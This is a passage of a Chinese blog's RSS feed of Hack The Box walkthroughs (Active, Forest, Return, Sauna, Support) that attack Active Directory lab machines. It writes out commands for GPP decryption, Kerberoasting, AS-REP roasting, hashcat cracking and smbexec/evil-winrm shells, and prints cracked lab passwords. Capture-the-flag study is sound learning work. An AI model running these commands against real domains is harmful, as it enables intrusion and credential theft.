&lt;p&gt;STREAMIO&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8e2af23e6e1232cf3c8c74ca9c6d6549image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;表名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE092d98297cb3dcdf9425e1f52fd32d62image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;列名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf06a3da5fc6fa9f6c7592d1700052202image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆用户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE73d4eb15471bc65d5caa1927142b8ce7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;James ,Theodore ,Samantha ,Lauren ,William ,Sabrina ,Robert ,Thane ,Carmon ,Barry ,Oliver ,Michelle ,Gloria ,Victoria ,Alexendra ,Baxter ,Clara ,Barbra ,Lenord ,Austin ,Garfield ,Juliette ,Victor ,Lucifer ,Bruno ,Diablo ,Robin ,Stan ,yoshihide ,admin ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,aikun&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X012 Active</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x012-active/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x012-active/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2b79f81f1e994947facb32e1d33427b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE57929fea3eb2c20e9a81cb222fdc2be2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;开始思考，从哪儿开始看起呢？还是smba吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe2ba0e29d1b9dba9ac848bc79d363f4dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：&lt;/p&gt;
&lt;p&gt;里面其实有东西的目录，应该就是这个目录了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE929b2ab801ddc22197d678d5b7b5f4c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE87ab11f980a529d243a7b64203c532cfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现疑似账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7d244a94d67021c2c41a4546cb9562eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：&lt;/p&gt;
&lt;p&gt;gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&lt;/p&gt;
&lt;p&gt;密码为：GPPstillStandingStrong2k18&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9bedd112f49203bcdfaa39d7ab9e3eb4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用该凭证再次登录smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE440f4d2843d061cfa22720a98c061501image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE08147a54fd1836d6a1164e3cc671b872image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录后发现flag:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE537bd27ee83c3e4a88037526309a618aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE21b1337ec915a036acf313ff94cfe1e7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：&lt;/p&gt;
&lt;h1 id=&#34;kerberoasting&#34;&gt;kerberoasting&lt;/h1&gt;
&lt;p&gt;使用GetUserSPNs.py查询所有注册于用户下的spn:&lt;/p&gt;
&lt;p&gt;python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd4ea9064ac216fbdda4e886205dc6e25image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获取ST，保存为hashcat能爆破的格式：&lt;/p&gt;
&lt;p&gt;python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE88b2ee81d90310dae17659e624785e0aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破：&lt;/p&gt;
&lt;p&gt;hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt &amp;ndash;force&lt;/p&gt;
&lt;p&gt;Ticketmaster1968&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5b8fa2eeaa852240dda639d8e2f24790image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smbexec:&lt;/p&gt;
&lt;p&gt;python /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X013 Forest</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x013-forest/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x013-forest/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93fdbc1cf8437edf1e751023e9ed1e2bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1e68350840d2018df4ed107ffb3f6c08image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE033784e1aad5bf646aee9b3abd881f80image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;smb无法利用，但是ldap存在匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc2050611b4266ff071f8d900185cfb69image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查询所有用户：&lt;/p&gt;
&lt;p&gt;ldapsearch -x -H ldap://10.10.10.161:389 -u &amp;rsquo;&amp;rsquo; -w &amp;rsquo;&amp;rsquo; -b &amp;ldquo;DC=htb,DC=local&amp;rdquo; &amp;ldquo;(&amp;amp;(objectCategory=person)(objectClass=user))&amp;rdquo; |grep dn&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfe4307047ea47ceafd2b1efe1def47d1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;经过一段处理：&lt;/p&gt;
&lt;p&gt;把用户名提取出来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE64f411aa6c41500447fed65e433ecdc4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到所有的用户名，几个想法：1、密码喷洒；2、AS-REP Roasting&lt;/p&gt;
&lt;p&gt;用impacket工具包的GetNPUsers.py进行爆破，尝试获取hash&lt;/p&gt;
&lt;p&gt;python ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/&lt;/p&gt;
&lt;p&gt;发现可用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEca0d1df87d377c387427b0c959ac35b2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解hash:&lt;/p&gt;
&lt;p&gt;s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8320a03326f3360b22481ebb4298c5b3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;5985开启，可用通过winrm getshell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb8bd0e5f6b4ae711c2d344b99403dcacimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE43c068ea933f27d2853b15eddedeec1dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;使用bloodhunnd:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb54eddfd1c767692663810ea6b449e24image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现两条路径：&lt;/p&gt;
&lt;p&gt;第一条是，CanPSRemote，通过登录来获取域管理员权限，但是前提是使用本地提权，然后DCSYNC，但是这条路不完全有效，后面看了一下，似乎不让读取系统信息，也就不要太好本地提权了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE50639070763fb043c8fb3a628461dedfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;第二条是通过EXCHANGE WINDOWS &lt;a href=&#34;mailto:PERMISSIONS@HTB.LOCALL&#34;&gt;PERMISSIONS@HTB.LOCALL&lt;/a&gt;这个组有完全控制权：bloodhound给的建议是给用户添加dcsync权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb406f0a27830d6d156e8a207be4c40bfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么如何进入EXCHANGE WINDOWS &lt;a href=&#34;mailto:PERMISSIONS@HTB.LOCALL&#34;&gt;PERMISSIONS@HTB.LOCALL&lt;/a&gt;组呢：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X014 Return</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x014-return/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x014-return/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe382420ae6c92d98a37732267ce502eaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEda43ac946da8dcb59c3afe808daeb124image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbd2dd6cc4db68b83646dbf96165b441eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;简单看了一下端口开放情况，存在一个80 http端口，5985 winrn端口，445端口，389 ldap等。&lt;/p&gt;
&lt;p&gt;域名：return.local&lt;/p&gt;
&lt;p&gt;主机名：PRINTER&lt;/p&gt;
&lt;p&gt;先看445吧：&lt;/p&gt;
&lt;p&gt;失败，没有匿名共享&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEba2a5a86757af35aac982a2fdd0867e9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后看ldap有没有匿名访问：&lt;/p&gt;
&lt;p&gt;有，匿名访问：&lt;/p&gt;
&lt;p&gt;罗列用户名：&lt;/p&gt;
&lt;p&gt;发现没有东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfcbb23001a2bfd7fc6ae55ca963c4049image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看来目标应该是从80端口下手了，80端口是个打印机，用户名为svc-printer，多半是主机用户名了：&lt;/p&gt;
&lt;p&gt;尝试进行密码爆破，失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d749002945688c86db1e87c25d04735image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;AS-REP Roasting试一下&lt;/p&gt;
&lt;p&gt;失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb3e47c3b025498e889b144cd31cd044bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;研究一下这个打印机怎么打：&lt;/p&gt;
&lt;p&gt;NTLM relay:&lt;/p&gt;
&lt;p&gt;居然直接成功了，还抓的明文密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9a9b4e0b1a11e12d39024ea17e2b2ddbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;[LDAP] Cleartext Client   : 10.10.11.108&lt;/p&gt;
&lt;p&gt;[LDAP] Cleartext Username : return\svc-printer&lt;/p&gt;
&lt;p&gt;[LDAP] Cleartext Password : 1edFg43012!!&lt;/p&gt;
&lt;p&gt;登录winrm，拿到flag&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2b70a385d46e20c450d99b858254e3ffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用bloodhound.py:&lt;/p&gt;
&lt;p&gt;分析结果，其实只能通过本地提权来进行，然后利用dcsync达到域管理员组：&lt;/p&gt;
&lt;p&gt;查看该成员的信息，可以发现该成员属于高价值目标组，SERVER &lt;a href=&#34;http://OPERATORS@RETURN.LOCAL&#34;&gt;OPERATORS@RETURN.LOCAL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE287aadd75af37792b33b0d28e6d9cc59image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winpe:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4b03948e76b801743e229db82977d14fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;改组成员可以修改服务，我们可以创建一个服务来提权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEafd9dff26e6b60b5736c08db8187220fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提权成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd0b0d47f3716e70a6f97c6022f336ed9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X015 Sauna</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x015-sauna/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x015-sauna/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE49ac89b8d9fc975a54b7bbd64c81db25image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdf27ea5a3375f8849e59ef7135199357image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9051728dcb75e68b87fda147a0f15623image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;基本信息：主机名：SAUNA，域名：EGOTISTICAL-BANK.LOCAL&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;大致看了一下端口开放情况，主要是445\389\5985\80比较关键：&lt;/p&gt;
&lt;p&gt;先看80：&lt;/p&gt;
&lt;p&gt;看样子是个金融贷款公司，可能有漏洞？&lt;/p&gt;
&lt;p&gt;然后是445，不存在匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf395e6bfb4e6a5391c26bc246f0182caimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后是389，看看有没有匿名枚举，有的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe6e0627ba3dd46051579f4fd3135285cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试试:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE43345cdd445fe6117b1b694db608d3d9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf8a1b0a0822276cbe6ce2f1bfc8ebac3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后用kerbrute看看这些用户是否是可用的，发现没有可用的用户，那么只能说ldap泄露的账户不完全正确：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE48192919b79c49373f50b68bbcdaeeb1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么只能试试cewl获取的信息是否正确了，有一个用户：sauna&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcd3e18432c5305db44589e2b48082706image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这个用户也失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4d8ac5327052431929313383e3827decimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;cewl可能不太行，试试手动：&lt;/p&gt;
&lt;p&gt;首字母+名字&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe1ed4fa76f0606bf81040ab0b065c13eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;AS-REP成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE99cb7b56363e8a08f851455e378a73aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解hash:&lt;/p&gt;
&lt;p&gt;Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbf086419fe9e18a0f6e1a78b3aeab7c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;由于5985的存在，可用winrm:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5a8c2e2dca84e63b0034bc97d00fb825image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;bloodhound和winpeass操作：&lt;/p&gt;
&lt;p&gt;疑似可以提权，但是好像没有配合的地方：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcd7c2c92a2ab22d533cbd50fb06894caimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后看看bloodhound，不知道为什么，使用exe输出的内容无法上传分析，使用py 生成的可以：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE24daefd682c0181e3f3a5c3bf89b4ae5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么关键就是他了：&lt;/p&gt;
&lt;p&gt;SVC_LOANMGR&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEdc67e192d7681daccaf2764dd61b32c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Kerberoasting失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbfa3e719d7c02949707bc314de0fa788image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再仔细看看内容：&lt;/p&gt;
&lt;p&gt;原来有密码：&lt;/p&gt;
&lt;p&gt;DefaultDomainName             :  EGOTISTICALBANK&lt;/p&gt;
&lt;p&gt;DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X016 Support</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x016-support/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x016-support/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5210351ecaab4ed72e1b4bf8ee75765d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEed69e887f32981ad919d9524cb6f0090%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;没有开放HTTP协议，主要是通过域内渗透方式进行&lt;/p&gt;
&lt;p&gt;SMB匿名登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbff327d0f4c284b632ee844164d0370b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE88308eb72b82e88e52dc73b8cbf33134%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这出现一个问题，不知到为啥，抓包看不到程序的发包&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb07edaf8d168cda964765ef93f596c6e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;主要考点：LDAP 轻量目录访问协议，理解上更像是一个树状图&lt;/p&gt;
&lt;p&gt;ldapsearch似乎-h与-p结合的使用方式被停用了？，帮助里面没看到这个用法，只能用-H了，&lt;/p&gt;
&lt;p&gt;-x使用简单认证&lt;/p&gt;
&lt;p&gt;-D用户名&lt;/p&gt;
&lt;p&gt;-w密码&lt;/p&gt;
&lt;p&gt;-W交互式输入密码&lt;/p&gt;
&lt;p&gt;-b指定basedn查询，分辨名，唯一标识，根&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ldapsearch -H ldap://10.10.11.174 -D ldap@support.htb -w &amp;#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&amp;#39; -b &amp;#34;dc=support,dc=htb&amp;#34; &amp;#34;*&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8fea50f5a65115346894cbd65d4dd4df%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密码，这里可以使用crackmapexec进行探测，这是一个用户内网渗透的探测工具：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7907cef0313332cde4376717d6f59cec%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;evil-winrm工具是 Winrm 服务利用工具，需要合法用户身份信息，使用5985端口连接：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;evil-winrm -u support -p Ironside47pleasure40Watchful -i 10.10.11.174
